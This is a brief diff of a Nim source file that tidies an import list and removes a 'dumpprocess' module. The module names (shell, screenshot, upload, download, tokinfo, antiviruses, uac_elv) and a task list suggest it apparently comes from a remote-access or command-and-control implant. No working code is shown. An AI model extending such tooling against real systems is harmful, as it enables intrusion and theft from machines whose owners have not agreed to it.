@@ -1,8 +1,6 @@
 import net
 
-import  download, msgbox, processes, screenshot, 
-        shell, tokinfo, upload, antiviruses, uac_elv,
-        dotnet_info, dumpprocess
+import download, msgbox, processes, screenshot, shell, tokinfo, upload, antiviruses, uac_elv, dotnet_info
 
 var tasks*: seq[tuple[
   name: string, 
